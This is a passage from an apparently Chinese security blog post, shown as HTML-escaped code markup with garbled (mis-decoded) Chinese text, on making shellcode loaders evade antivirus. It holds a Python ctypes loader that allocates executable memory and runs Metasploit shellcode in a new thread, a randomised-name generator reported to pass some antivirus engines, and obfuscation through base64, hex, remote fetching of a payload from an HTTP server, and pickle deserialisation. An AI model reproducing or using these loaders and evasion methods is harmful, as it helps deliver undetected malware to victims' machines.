&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var6&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var7&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var8&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var9&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var10&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var11&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var12&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var13&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var14&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var15&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var16&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">shellc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">lef&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">rig&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var2&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var3&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">fun1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var4&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var5&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var6&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var7&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var8&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var9&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var10&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var11&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var12&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var13&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var14&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var15&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">var16&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">shellc&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">build_AV&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æŸ¥æ€ç»“æœ&lt;a href="https://www.virustotal.com/gui/file/7e1819ae2d57eb451210abcab590f19e095f728349683612e2bf0fd26a3b3374">12/69&lt;/a>ï¼Œå¯è¿‡ç«ç»’&lt;/p>
&lt;h3 id="python">Python&lt;/h3>
&lt;p>ä½¿ç”¨å†…ç½®çš„&lt;code>ctypes&lt;/code>åº“å¯ä»¥ä¸æ»‘åœ°è°ƒç”¨kernel32.dllçš„å‡½æ•°ï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„æ˜¯ç”±äº64ä½ä¸32ä½ç³»ç»Ÿçš„å·®å¼‚ï¼ˆä¼šå½±å“pythonå¯¹äºæŒ‡é’ˆçš„å¤„ç†ï¼‰ï¼Œéœ€è¦åœ¨æœ€å¼€å§‹è®¾ç½®&lt;code>VirtualAlloc.restype = ctypes.c_uint64&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">VirtualAlloc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">restype&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_uint64&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¹¶ä¸”äº²æµ‹åœ¨64ä½ç³»ç»Ÿä¸Šæ— æ³•å¤„ç†msfç”Ÿæˆçš„32ä½shellcodeï¼Œæƒ¨æƒ¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">VirtualAlloc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">restype&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_uint64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytearray&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ptr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">VirtualAlloc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0x3000&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0x40&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">buf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">from_buffer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">RtlMoveMemory&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_uint64&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ptr&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># åˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">CreateThread&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_uint64&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ptr&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pointer&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># ç­‰å¾…ä¸Šé¢åˆ›å»ºçš„çº¿ç¨‹è¿è¡Œç»“æŸ&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">windll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">kernel32&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">WaitForSingleObject&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">handle&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">c_int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å¯¹shellcodeè¿›è¡Œb64å¤„ç†&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">_shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytearray&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>hexå¤„ç†&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> bytearray&lt;span style="color:#f92672">(&lt;/span>_shellcode.decode&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hex&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="è¿œç¨‹wget">è¿œç¨‹wget&lt;/h4>
&lt;p>æ³¨æ„å°½é‡é¿å…å‡ºç°ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚æœæœ‰ äºŒæ¬¡å¤„ç†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib.request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">codeces&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">urlopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://192.168.1.1:8000/test.txt&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e"># b64æ ¼å¼çš„payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">codecs&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">escape_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytearray&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="pickleååºåˆ—åŒ–">pickleååºåˆ—åŒ–&lt;/h4>
&lt;p>ctfå­¦åˆ°çš„æŠ€å·§ä¸èƒ½ä¸¢ï¼Œæ¯”å•çº¯çš„hex, xor, b64ç¨å¾®å¼ºä¸€ç‚¹ç‚¹ï¼Œå¯ä»¥é…åˆä¸Šé¢çš„è¿œç¨‹wgetæ–¹å¼ç»•è¿‡&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">urllib.requests&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">codeces&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># ç”Ÿæˆ&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#75715e"># ä¸Šé¢åŸºç¡€æ¬¾çš„å…¨éƒ¨ä»£ç &lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exec&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">shellcode&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret_base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret&lt;/span>&lt;span style="color:#111">)&lt;/span>
